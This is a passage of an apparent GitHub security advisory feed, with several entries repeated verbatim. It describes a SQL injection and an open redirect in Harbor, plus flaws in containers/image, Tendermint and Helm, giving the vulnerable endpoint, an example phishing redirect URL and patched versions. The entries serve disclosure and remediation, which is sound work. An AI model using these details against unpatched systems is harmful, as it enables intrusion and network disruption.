<p>A user with an administrator, project_admin, or project_maintainer role could utilize and exploit SQL Injection to allow the execution of any Postgres function or the extraction of sensitive information from the database through this API:</p>
<pre><code>GET /api/v2.0/projects/{project_name}/repositories/{repository_name}/artifacts/{reference}/scan/{report_id}/log
</code></pre>
<p>The SQL injection might happen in the code: </p>
<p><a href="https://github.com/goharbor/harbor/blob/9b7c1a2274fbc5ea16e19a484532f86c08926577/src/pkg/task/task.go#L241">https://github.com/goharbor/harbor/blob/9b7c1a2274fbc5ea16e19a484532f86c08926577/src/pkg/task/task.go#L241</a></p>
<p>Because raw SQL executed in ormer.Raw(Sql).QueryRows() is PrepareStatement. In the driver of Postgres, one PrepareStatement must contain only ONE SQL command, see <a href="https://www.postgresql.org/docs/15/libpq-exec.html#LIBPQ-PQPREPARE">https://www.postgresql.org/docs/15/libpq-exec.html#LIBPQ-PQPREPARE</a>.  The SQL should start with:</p>
<pre><code>SELECT * FROM task WHERE extra_attrs::jsonb-&gt;'report_uuids' @&gt;
</code></pre>
<p>Adding a delete/update operation by appending malicious content to the current SQL is impossible. Furthermore, the query result of the task is just an intermediate result, the task ID is used to locate the job log file, and the response only contains the content of the job log file. so this vulnerability can be used to execute SQL functions, but it can't leak any useful information to the response.</p>
<p>Harbor &gt;=v2.8.1, &gt;=2.9.0, &gt;=2.10.0 are impacted.</p>
<h3 id="patches">Patches</h3>
<p>Harbor v2.8.6, v2.9.4, v2.10.2 fixes this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue.</p>
<h3 id="credits">Credits</h3>
<p>Thanks Taisei Inoue (<a href="mailto:taisei.inoue@gmo-cybersecurity.com">taisei.inoue@gmo-cybersecurity.com</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goharbor/harbor/security/advisories/GHSA-vw63-824v-qf2j">https://github.com/goharbor/harbor/security/advisories/GHSA-vw63-824v-qf2j</a></li>
<li><a href="https://github.com/advisories/GHSA-vw63-824v-qf2j">https://github.com/advisories/GHSA-vw63-824v-qf2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vw63-824v-qf2j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-02T22:32:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goharbor/harbor] SQL Injection in Harbor scan log API]]></title>
        <id>https://github.com/advisories/GHSA-vw63-824v-qf2j</id>
        <link href="https://github.com/advisories/GHSA-vw63-824v-qf2j"/>
        <updated>2024-06-02T22:32:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A user with an administrator, project_admin, or project_maintainer role could utilize and exploit SQL Injection to allow the execution of any Postgres function or the extraction of sensitive information from the database through this API:</p>
<pre><code>GET /api/v2.0/projects/{project_name}/repositories/{repository_name}/artifacts/{reference}/scan/{report_id}/log
</code></pre>
<p>The SQL injection might happen in the code: </p>
<p><a href="https://github.com/goharbor/harbor/blob/9b7c1a2274fbc5ea16e19a484532f86c08926577/src/pkg/task/task.go#L241">https://github.com/goharbor/harbor/blob/9b7c1a2274fbc5ea16e19a484532f86c08926577/src/pkg/task/task.go#L241</a></p>
<p>Because raw SQL executed in ormer.Raw(Sql).QueryRows() is PrepareStatement. In the driver of Postgres, one PrepareStatement must contain only ONE SQL command, see <a href="https://www.postgresql.org/docs/15/libpq-exec.html#LIBPQ-PQPREPARE">https://www.postgresql.org/docs/15/libpq-exec.html#LIBPQ-PQPREPARE</a>.  The SQL should start with:</p>
<pre><code>SELECT * FROM task WHERE extra_attrs::jsonb-&gt;'report_uuids' @&gt;
</code></pre>
<p>Adding a delete/update operation by appending malicious content to the current SQL is impossible. Furthermore, the query result of the task is just an intermediate result, the task ID is used to locate the job log file, and the response only contains the content of the job log file. so this vulnerability can be used to execute SQL functions, but it can't leak any useful information to the response.</p>
<p>Harbor &gt;=v2.8.1, &gt;=2.9.0, &gt;=2.10.0 are impacted.</p>
<h3 id="patches">Patches</h3>
<p>Harbor v2.8.6, v2.9.4, v2.10.2 fixes this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue.</p>
<h3 id="credits">Credits</h3>
<p>Thanks Taisei Inoue (<a href="mailto:taisei.inoue@gmo-cybersecurity.com">taisei.inoue@gmo-cybersecurity.com</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goharbor/harbor/security/advisories/GHSA-vw63-824v-qf2j">https://github.com/goharbor/harbor/security/advisories/GHSA-vw63-824v-qf2j</a></li>
<li><a href="https://github.com/advisories/GHSA-vw63-824v-qf2j">https://github.com/advisories/GHSA-vw63-824v-qf2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vw63-824v-qf2j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-02T22:32:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goharbor/harbor] SQL Injection in Harbor scan log API]]></title>
        <id>https://github.com/advisories/GHSA-vw63-824v-qf2j</id>
        <link href="https://github.com/advisories/GHSA-vw63-824v-qf2j"/>
        <updated>2024-06-02T22:32:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A user with an administrator, project_admin, or project_maintainer role could utilize and exploit SQL Injection to allow the execution of any Postgres function or the extraction of sensitive information from the database through this API:</p>
<pre><code>GET /api/v2.0/projects/{project_name}/repositories/{repository_name}/artifacts/{reference}/scan/{report_id}/log
</code></pre>
<p>The SQL injection might happen in the code: </p>
<p><a href="https://github.com/goharbor/harbor/blob/9b7c1a2274fbc5ea16e19a484532f86c08926577/src/pkg/task/task.go#L241">https://github.com/goharbor/harbor/blob/9b7c1a2274fbc5ea16e19a484532f86c08926577/src/pkg/task/task.go#L241</a></p>
<p>Because raw SQL executed in ormer.Raw(Sql).QueryRows() is PrepareStatement. In the driver of Postgres, one PrepareStatement must contain only ONE SQL command, see <a href="https://www.postgresql.org/docs/15/libpq-exec.html#LIBPQ-PQPREPARE">https://www.postgresql.org/docs/15/libpq-exec.html#LIBPQ-PQPREPARE</a>.  The SQL should start with:</p>
<pre><code>SELECT * FROM task WHERE extra_attrs::jsonb-&gt;'report_uuids' @&gt;
</code></pre>
<p>Adding a delete/update operation by appending malicious content to the current SQL is impossible. Furthermore, the query result of the task is just an intermediate result, the task ID is used to locate the job log file, and the response only contains the content of the job log file. so this vulnerability can be used to execute SQL functions, but it can't leak any useful information to the response.</p>
<p>Harbor &gt;=v2.8.1, &gt;=2.9.0, &gt;=2.10.0 are impacted.</p>
<h3 id="patches">Patches</h3>
<p>Harbor v2.8.6, v2.9.4, v2.10.2 fixes this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround for this issue.</p>
<h3 id="credits">Credits</h3>
<p>Thanks Taisei Inoue (<a href="mailto:taisei.inoue@gmo-cybersecurity.com">taisei.inoue@gmo-cybersecurity.com</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goharbor/harbor/security/advisories/GHSA-vw63-824v-qf2j">https://github.com/goharbor/harbor/security/advisories/GHSA-vw63-824v-qf2j</a></li>
<li><a href="https://github.com/advisories/GHSA-vw63-824v-qf2j">https://github.com/advisories/GHSA-vw63-824v-qf2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vw63-824v-qf2j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-02T22:32:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goharbor/harbor] Open Redirect URL in Harbor]]></title>
        <id>https://github.com/advisories/GHSA-5757-v49g-f6r7</id>
        <link href="https://github.com/advisories/GHSA-5757-v49g-f6r7"/>
        <updated>2024-06-02T22:32:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Under OIDC authentication mode, there is a redirect_url parameter exposed in the URL which is used to redirect the current user to the defined location after the successful OIDC login, This redirect_url can be an ambiguous URL and can be used to embed a phishing URL.
For example: if a user clicks the URL with a malicious redirect_url:</p>
<pre><code>https://&lt;harbor_hostnmae&gt;/c/oidc/login?redirect_url=https://&lt;redirect_domain&gt;
</code></pre>
<p>It might redirect the current user without their knowledge to a malicious site, posing a potential risk.
To avoid this issue, the redirect_url should be checked if it is a local path when reading it from the original request URL. </p>
<pre><code>//src/core/controllers/oidc.go
...
redirectURL := oc.Ctx.Request.URL.Query().Get("redirect_url")
if !utils.IsLocalPath(redirectURL) {
    log.Errorf("invalid redirect url: %v", redirectURL)
    oc.SendBadRequestError(fmt.Errorf("cannot redirect to other site"))
    return
}
if err := oc.SetSession(redirectURLKey, redirectURL); err != nil {
...
</code></pre>
<h3 id="impact">Impact</h3>
<p>When Harbor is configured with OIDC authentication and users log in via a link outside the Harbor server, it might be vulnerable to an open redirect attack. This attack only involves the OIDC Harbor user, if the current Harbor instance is not configured with OIDC auth, the redirect_url doesn't exist and the Harbor instance is not vulnerable to the open redirect attack.</p>
<p>The following versions of Harbor are involved:
&lt;=Harbor 2.8.4, &lt;=Harbor 2.9.2, &lt;= Harbor 2.10.0</p>
<h3 id="patches">Patches</h3>
<p>Harbor 2.8.5, Harbor 2.9.3, Harbor 2.10.1</p>
<h3 id="workarounds">Workarounds</h3>
<p>When the Harbor is configured with OIDC authentication, warn the user not to log into the Harbor through external links.</p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="credit">Credit</h3>
<p>Thanks Arnaud Cordier (<a href="mailto:arnaud@cordier.work">arnaud@cordier.work</a>)</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/goharbor/harbor/security/advisories/GHSA-5757-v49g-f6r7">https://github.com/goharbor/harbor/security/advisories/GHSA-5757-v49g-f6r7</a></li>
<li><a href="https://github.com/advisories/GHSA-5757-v49g-f6r7">https://github.com/advisories/GHSA-5757-v49g-f6r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5757-v49g-f6r7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-02T22:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goharbor/harbor] Open Redirect URL in Harbor]]></title>
        <id>https://github.com/advisories/GHSA-5757-v49g-f6r7</id>
        <link href="https://github.com/advisories/GHSA-5757-v49g-f6r7"/>
        <updated>2024-06-02T22:32:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Under OIDC authentication mode, there is a redirect_url parameter exposed in the URL which is used to redirect the current user to the defined location after the successful OIDC login, This redirect_url can be an ambiguous URL and can be used to embed a phishing URL.
For example: if a user clicks the URL with a malicious redirect_url:</p>
<pre><code>https://&lt;harbor_hostnmae&gt;/c/oidc/login?redirect_url=https://&lt;redirect_domain&gt;
</code></pre>
<p>It might redirect the current user without their knowledge to a malicious site, posing a potential risk.
To avoid this issue, the redirect_url should be checked if it is a local path when reading it from the original request URL. </p>
<pre><code>//src/core/controllers/oidc.go
...
redirectURL := oc.Ctx.Request.URL.Query().Get("redirect_url")
if !utils.IsLocalPath(redirectURL) {
    log.Errorf("invalid redirect url: %v", redirectURL)
    oc.SendBadRequestError(fmt.Errorf("cannot redirect to other site"))
    return
}
if err := oc.SetSession(redirectURLKey, redirectURL); err != nil {
...
</code></pre>
<h3 id="impact">Impact</h3>
<p>When Harbor is configured with OIDC authentication and users log in via a link outside the Harbor server, it might be vulnerable to an open redirect attack. This attack only involves the OIDC Harbor user, if the current Harbor instance is not configured with OIDC auth, the redirect_url doesn't exist and the Harbor instance is not vulnerable to the open redirect attack.</p>
<p>The following versions of Harbor are involved:
&lt;=Harbor 2.8.4, &lt;=Harbor 2.9.2, &lt;= Harbor 2.10.0</p>
<h3 id="patches">Patches</h3>
<p>Harbor 2.8.5, Harbor 2.9.3, Harbor 2.10.1</p>
<h3 id="workarounds">Workarounds</h3>
<p>When the Harbor is configured with OIDC authentication, warn the user not to log into the Harbor through external links.</p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="credit">Credit</h3>
<p>Thanks Arnaud Cordier (<a href="mailto:arnaud@cordier.work">arnaud@cordier.work</a>)</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/goharbor/harbor/security/advisories/GHSA-5757-v49g-f6r7">https://github.com/goharbor/harbor/security/advisories/GHSA-5757-v49g-f6r7</a></li>
<li><a href="https://github.com/advisories/GHSA-5757-v49g-f6r7">https://github.com/advisories/GHSA-5757-v49g-f6r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5757-v49g-f6r7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-02T22:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/goharbor/harbor] Open Redirect URL in Harbor]]></title>
        <id>https://github.com/advisories/GHSA-5757-v49g-f6r7</id>
        <link href="https://github.com/advisories/GHSA-5757-v49g-f6r7"/>
        <updated>2024-06-02T22:32:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Under OIDC authentication mode, there is a redirect_url parameter exposed in the URL which is used to redirect the current user to the defined location after the successful OIDC login, This redirect_url can be an ambiguous URL and can be used to embed a phishing URL.
For example: if a user clicks the URL with a malicious redirect_url:</p>
<pre><code>https://&lt;harbor_hostnmae&gt;/c/oidc/login?redirect_url=https://&lt;redirect_domain&gt;
</code></pre>
<p>It might redirect the current user without their knowledge to a malicious site, posing a potential risk.
To avoid this issue, the redirect_url should be checked if it is a local path when reading it from the original request URL. </p>
<pre><code>//src/core/controllers/oidc.go
...
redirectURL := oc.Ctx.Request.URL.Query().Get("redirect_url")
if !utils.IsLocalPath(redirectURL) {
    log.Errorf("invalid redirect url: %v", redirectURL)
    oc.SendBadRequestError(fmt.Errorf("cannot redirect to other site"))
    return
}
if err := oc.SetSession(redirectURLKey, redirectURL); err != nil {
...
</code></pre>
<h3 id="impact">Impact</h3>
<p>When Harbor is configured with OIDC authentication and users log in via a link outside the Harbor server, it might be vulnerable to an open redirect attack. This attack only involves the OIDC Harbor user, if the current Harbor instance is not configured with OIDC auth, the redirect_url doesn't exist and the Harbor instance is not vulnerable to the open redirect attack.</p>
<p>The following versions of Harbor are involved:
&lt;=Harbor 2.8.4, &lt;=Harbor 2.9.2, &lt;= Harbor 2.10.0</p>
<h3 id="patches">Patches</h3>
<p>Harbor 2.8.5, Harbor 2.9.3, Harbor 2.10.1</p>
<h3 id="workarounds">Workarounds</h3>
<p>When the Harbor is configured with OIDC authentication, warn the user not to log into the Harbor through external links.</p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="credit">Credit</h3>
<p>Thanks Arnaud Cordier (<a href="mailto:arnaud@cordier.work">arnaud@cordier.work</a>)</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/goharbor/harbor/security/advisories/GHSA-5757-v49g-f6r7">https://github.com/goharbor/harbor/security/advisories/GHSA-5757-v49g-f6r7</a></li>
<li><a href="https://github.com/advisories/GHSA-5757-v49g-f6r7">https://github.com/advisories/GHSA-5757-v49g-f6r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5757-v49g-f6r7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-02T22:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/image/v5] github.com/containers/image allows unexpected authenticated registry accesses]]></title>
        <id>https://github.com/advisories/GHSA-6wvf-f2vw-3425</id>
        <link href="https://github.com/advisories/GHSA-6wvf-f2vw-3425"/>
        <updated>2024-05-31T19:31:44.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in the github.com/containers/image library. This flaw allows attackers to trigger unexpected authenticated registry accesses on behalf of a victim user, causing resource exhaustion, local path traversal, and other attacks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3727">https://nvd.nist.gov/vuln/detail/CVE-2024-3727</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-3727">https://access.redhat.com/security/cve/CVE-2024-3727</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2274767">https://bugzilla.redhat.com/show_bug.cgi?id=2274767</a></li>
<li><a href="https://github.com/containers/image/releases/tag/v5.30.1">https://github.com/containers/image/releases/tag/v5.30.1</a></li>
<li><a href="https://github.com/containers/image/commit/132678b47bae29c710589012668cb85859d88385">https://github.com/containers/image/commit/132678b47bae29c710589012668cb85859d88385</a></li>
<li><a href="https://github.com/containers/image/commit/e8948046055060605bd68289d406ce149590c33a">https://github.com/containers/image/commit/e8948046055060605bd68289d406ce149590c33a</a></li>
<li><a href="https://github.com/containers/image/releases/tag/v5.29.3">https://github.com/containers/image/releases/tag/v5.29.3</a></li>
<li><a href="https://github.com/advisories/GHSA-6wvf-f2vw-3425">https://github.com/advisories/GHSA-6wvf-f2vw-3425</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6wvf-f2vw-3425</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-14T18:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/image/v5] github.com/containers/image allows unexpected authenticated registry accesses]]></title>
        <id>https://github.com/advisories/GHSA-6wvf-f2vw-3425</id>
        <link href="https://github.com/advisories/GHSA-6wvf-f2vw-3425"/>
        <updated>2024-05-31T19:31:44.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in the github.com/containers/image library. This flaw allows attackers to trigger unexpected authenticated registry accesses on behalf of a victim user, causing resource exhaustion, local path traversal, and other attacks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3727">https://nvd.nist.gov/vuln/detail/CVE-2024-3727</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-3727">https://access.redhat.com/security/cve/CVE-2024-3727</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2274767">https://bugzilla.redhat.com/show_bug.cgi?id=2274767</a></li>
<li><a href="https://github.com/containers/image/releases/tag/v5.30.1">https://github.com/containers/image/releases/tag/v5.30.1</a></li>
<li><a href="https://github.com/containers/image/commit/132678b47bae29c710589012668cb85859d88385">https://github.com/containers/image/commit/132678b47bae29c710589012668cb85859d88385</a></li>
<li><a href="https://github.com/containers/image/commit/e8948046055060605bd68289d406ce149590c33a">https://github.com/containers/image/commit/e8948046055060605bd68289d406ce149590c33a</a></li>
<li><a href="https://github.com/containers/image/releases/tag/v5.29.3">https://github.com/containers/image/releases/tag/v5.29.3</a></li>
<li><a href="https://github.com/advisories/GHSA-6wvf-f2vw-3425">https://github.com/advisories/GHSA-6wvf-f2vw-3425</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6wvf-f2vw-3425</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-14T18:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/tendermint/tendermint] Denial of Service in TenderMint]]></title>
        <id>https://github.com/advisories/GHSA-6jqj-f58p-mrw3</id>
        <link href="https://github.com/advisories/GHSA-6jqj-f58p-mrw3"/>
        <updated>2024-05-31T17:46:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p><strong>Denial of Service</strong></p>
<p>Tendermint 0.33.0 and above allow block proposers to include signatures for the wrong block. This may happen naturally if you start a network, have it run for some time and restart it without changing the chainID. (It is a <a href="https://docs.tendermint.com/master/tendermint-core/using-tendermint.html">misconfiguration</a> to reuse chainIDs.) Correct block proposers will accidentally include signatures for the wrong block if they see these signatures, and then commits won't validate, making all proposed blocks invalid. A malicious validator (even with a minimal amount of stake) can use this vulnerability to completely halt the network.</p>
<p>Tendermint 0.33.6 checks all the signatures are for the block with +2/3 majority before creating a commit.</p>
<p><strong>False Witness</strong></p>
<p>Tendermint 0.33.1 and above are no longer fully verifying commit signatures during block execution - they stop after +2/3. This means proposers can propose blocks that contain valid +2/3 signatures and then the rest of the signatures can be whatever they want. They can claim that all the other validators signed just by including a CommitSig with arbitrary signature data. While this doesn't seem to impact safety of Tendermint per se, it means that Commits may contain a lot of invalid data **.</p>
<p><em>** This was already true of blocks, since they could include invalid txs filled with garbage, but in that case the application knew that they are invalid and could punish the proposer. But since applications didn't--and don't-- verify commit signatures directly (they trust Tendermint to do that), they won't be able to detect it.</em></p>
<p>This can impact incentivization logic in the application that depends on the LastCommitInfo sent in BeginBlock, which includes which validators signed. For instance, Gaia incentivizes proposers with a bonus for including more than +2/3 of the signatures. But a proposer can now claim that bonus just by including arbitrary data for the final -1/3 of validators without actually waiting for their signatures. There may be other tricks that can be played because of this.</p>
<p>Tendermint 0.33.6 verifies all the signatures during block execution ***.</p>
<p><em>*** Please note that the light client does not check nil votes and exits as soon as 2/3+ of the signatures are checked.</em></p>
<h3 id="impact">Impact</h3>
<ul>
<li>All nodes</li>
<li>The network stops due to having a commit with a wrong signature.</li>
</ul>
<h3 id="patches">Patches</h3>
<ul>
<li>v0.33.6 andn v0.34.0-dev1.0.20200702134149-480b995a3172</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tendermint/tendermint/issues/4926">https://github.com/tendermint/tendermint/issues/4926</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/tendermint/tendermint">tendermint/tendermint</a></li>
<li>Email us at <a href="mailto:security@tendermint.com">security@tendermint.com</a></li>
</ul>
<p>More information can be found <a href="https://tendermint.com/security/">here</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tendermint/tendermint/security/advisories/GHSA-6jqj-f58p-mrw3">https://github.com/tendermint/tendermint/security/advisories/GHSA-6jqj-f58p-mrw3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15091">https://nvd.nist.gov/vuln/detail/CVE-2020-15091</a></li>
<li><a href="https://github.com/tendermint/tendermint/issues/4926">https://github.com/tendermint/tendermint/issues/4926</a></li>
<li><a href="https://github.com/tendermint/tendermint/commit/480b995a31727593f58b361af979054d17d84340">https://github.com/tendermint/tendermint/commit/480b995a31727593f58b361af979054d17d84340</a></li>
<li><a href="https://github.com/tendermint/tendermint/pull/5426">https://github.com/tendermint/tendermint/pull/5426</a></li>
<li><a href="https://github.com/tendermint/tendermint/blob/master/CHANGELOG.md#v0336">https://github.com/tendermint/tendermint/blob/master/CHANGELOG.md#v0336</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2021-0090">https://pkg.go.dev/vuln/GO-2021-0090</a></li>
<li><a href="https://github.com/advisories/GHSA-6jqj-f58p-mrw3">https://github.com/advisories/GHSA-6jqj-f58p-mrw3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6jqj-f58p-mrw3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-12-20T18:17:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/tendermint/tendermint] Tendermint Core vulnerable to Uncontrolled Resource Consumption]]></title>
        <id>https://github.com/advisories/GHSA-p658-8693-mhvg</id>
        <link href="https://github.com/advisories/GHSA-p658-8693-mhvg"/>
        <updated>2024-05-31T16:54:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Tendermint Core v0.34.0 introduced a new way of handling evidence of misbehavior. As part of this, <a href="https://github.com/tendermint/tendermint/pull/5219">we added a new <code>Timestamp</code> field to <code>Evidence</code> structs</a>. This timestamp would be calculated using the same algorithm that is used when a block is created and proposed. (This algorithm relies on the timestamp of the last commit from this specific block.) </p>
<p>In Tendermint Core v0.34.0-v0.34.2, the <code>consensus</code> reactor is responsible for forming <code>DuplicateVoteEvidence</code> whenever double signs are observed. However, the current block is still “in flight” when it is being formed by the <code>consensus</code> reactor. It hasn’t been finalized through network consensus yet. This means that different nodes in the network may observe different “last commits” when assigning a timestamp to <code>DuplicateVoteEvidence.</code></p>
<p>In turn, different nodes could form <code>DuplicateVoteEvidence</code> objects at the same height but with different timestamps. One <code>DuplicateVoteEvidence</code> object (with one timestamp) will then eventually get finalized in the block, but this means that any <code>DuplicateVoteEvidence</code> with a different timestamp is considered invalid. Any node that formed invalid <code>DuplicateVoteEvidence</code> will continue to propose invalid evidence; its peers may see this, and choose to disconnect from this node. This bug means that double signs are DoS vectors in Tendermint Core v0.34.0-v0.34.2. </p>
<p>Tendermint Core v0.34.3 is a security release which fixes this bug. As of v0.34.3, <code>DuplicateVoteEvidence</code> is no longer formed by the <code>consensus</code> reactor; rather, the <code>consensus</code> reactor passes the <code>Vote</code>s themselves into the <code>EvidencePool</code>, which is now responsible for forming <code>DuplicateVoteEvidence</code>. The <code>EvidencePool</code> has timestamp info that should be consistent across the network, which means that <code>DuplicateVoteEvidence</code> formed in this reactor should have consistent timestamps. </p>
<p>This release changes the API between the <code>consensus</code> and <code>evidence</code> reactors. </p>
<h3 id="impact">Impact</h3>
<p>This is a denial-of-service vector which impacts networks running Tendermint Core v0.34.0 - v0.34.2.</p>
<h3 id="remediation">Remediation</h3>
<p>This problem has been patched in Tendermint Core v0.34.3. Networks running impacted versions of Tendermint Core should update immediately.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds, other than upgrading to a patched version of Tendermint Core.</p>
<h3 id="credits">Credits</h3>
<ul>
<li>Crypto.com (@cyril-crypto, @brianatcrypto, @tomtau and  @yihuang) for finding and submitting this vulnerability</li>
<li>@melekes and @cmwaters for identifying the root cause and patching the problem</li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/tendermint/tendermint">tendermint/tendermint</a></li>
<li>Email us at <a href="mailto:security@tendermint.com">security@tendermint.com</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tendermint/tendermint/security/advisories/GHSA-p658-8693-mhvg">https://github.com/tendermint/tendermint/security/advisories/GHSA-p658-8693-mhvg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21271">https://nvd.nist.gov/vuln/detail/CVE-2021-21271</a></li>
<li><a href="https://github.com/tendermint/tendermint/commit/a2a6852ab99e4a0f9e79f0ea8c1726e262e25c76">https://github.com/tendermint/tendermint/commit/a2a6852ab99e4a0f9e79f0ea8c1726e262e25c76</a></li>
<li><a href="https://github.com/tendermint/tendermint/blob/v0.34.3/CHANGELOG.md#v0.34.3">https://github.com/tendermint/tendermint/blob/v0.34.3/CHANGELOG.md#v0.34.3</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1052">https://pkg.go.dev/vuln/GO-2022-1052</a></li>
<li><a href="https://github.com/tendermint/tendermint/pull/5219">https://github.com/tendermint/tendermint/pull/5219</a></li>
<li><a href="https://github.com/advisories/GHSA-p658-8693-mhvg">https://github.com/advisories/GHSA-p658-8693-mhvg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p658-8693-mhvg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-07T07:23:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[helm.sh/helm/v3] Improper Neutralization of Special Elements in Output in helm.sh/helm/v3]]></title>
        <id>https://github.com/advisories/GHSA-c38g-469g-cmgx</id>
        <link href="https://github.com/advisories/GHSA-c38g-469g-cmgx"/>
        <updated>2024-05-31T16:48:31.000Z</updated>
        <content type="html"><![CDATA[<p>Since Helm 2 was released, a well-documented aspect of Helm is that the Helm chart's version number MUST follow the SemVer2 specification. In the past, Helm would not permit charts with malformed versions. At some point, a patch was merged that changed this - On a version parse error, the version number was simply passed along as-is. This provided a vector for malicious data to be injected into Helm and potentially used in various ways.</p>
<p>Core maintainers were able to send deceptive information to a terminal screen running the <code>helm</code> command, as well as obscure or alter information on the screen. In some cases, we could send codes that terminals used to execute higher-order logic, like clearing a terminal screen.</p>
<p>Further, during evaluation, the Helm maintainers discovered a few other fields that were not properly sanitized when read out of repository index files. This fix remedies all such cases, and once again enforces SemVer2 policies on version fields.</p>
<p>All users of the Helm 3 should upgrade.</p>
<p>Those who use Helm as a library should verify that they either sanitize this data on their own, or use the proper Helm API calls to sanitize the data.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been resolved in Helm 3.5.2.</p>
<p>While this fix does not constitute a breaking change, as all field formatting is now enforced as documented, it is possible that charts that were mistakenly allowed (but invalid) may no longer be available in search indexes. Specifically, <strong>malformed SemVer versions are no longer supported</strong>. This has always been the documented case, but it is true that malformed versions were allowed.</p>
<p>Note that this is the first security release since Helm 2's final deprecation. Helm 2 was not audited for vulnerability to this issue, and should be assumed vulnerable.</p>
<h3 id="references">References</h3>
<ul>
